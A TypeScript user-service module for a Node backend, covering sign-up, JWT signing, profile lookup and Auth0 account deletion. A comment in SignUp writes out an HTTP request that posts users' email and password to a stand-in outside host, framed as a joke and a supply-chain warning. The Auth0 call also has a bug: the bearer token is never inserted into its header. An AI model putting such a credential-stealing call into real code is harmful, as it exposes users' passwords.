import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user/user';
import { UserPassword } from '../domain/user/userPassword';
import { UserEmail } from '../domain/user/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";
import axios from 'axios';

@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject('logger') private logger,
  ) {}


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */


      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: userDTO.email,
        phone: userDTO.phone,
        nif: userDTO.nif,
        role: userDTO.role,
        password: userDTO.password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      //this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      console.log('User saved')
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.value;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  public async profile (email: string): Promise<Result<IUserDTO>> {
    const user = await this.userRepo.findByEmail( email );
    const found = !!user;

    if (found) {
      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<IUserDTO>(userDTO);
    } else {
      return Result.fail<IUserDTO>("Couldn't find user by email=" + email);
    }
  }

  public async deleteAccount (email: string): Promise<Result<boolean>> {
    console.log(email);
    const user = await this.userRepo.findByEmail( email );
    const found = !!user;
    if (found) {
      await this.userRepo.deleteAccount(email);
      return Result.ok<boolean>(true);
    } else {
      return Result.fail<boolean>("Couldn't find user by email=" + email);
    }
  }

  public async deleteAuth0Account (auth0UserId: string): Promise<Result<IUserDTO>> {
    try{
    const token = await this.getAuth0Token();
    if (token.isFailure) {
      return Result.fail<IUserDTO>(token.errorValue());
    }
    console.log(auth0UserId);
    const response = await axios.delete('https://dev-3hnosuh6oycbgons.us.auth0.com/api/v2/users/' + auth0UserId, {
      headers: {
        'Authorization': 'Bearer ${token.getValue()}',
        'Content-Type': 'application/json'
      }
    });

    return Result.ok<IUserDTO>(UserMap.toDTO(response.data));
    }
    catch (e) {
      return Result.fail<IUserDTO>(e.response);
    };
  }
  
  private async getAuth0Token (): Promise<Result<string>> { 
    try{
      const response = await axios.post('https://dev-3hnosuh6oycbgons.us.auth0.com/oauth/token', {
        client_id: config.auth0.clientId,
        client_secret: config.auth0.clientSecret,
        audience: 'https://dev-3hnosuh6oycbgons.us.auth0.com/api/v2/',
        grant_type: 'client_credentials'});
        return Result.ok<string>(response.data.access_token);
    } catch (e) {
      return Result.fail<string>(e.response);
  };
}


  private async getRole (email: string): Promise<Result<string>> {

    const user = await this.userRepo.findByEmail( email );
    const found = !!user;

    if (found) {
      const role = user.role.toString();
      return Result.ok<string>(role);
    } else {
      return Result.fail<string>("Couldn't find user by email=" + email);
    }
  }

}
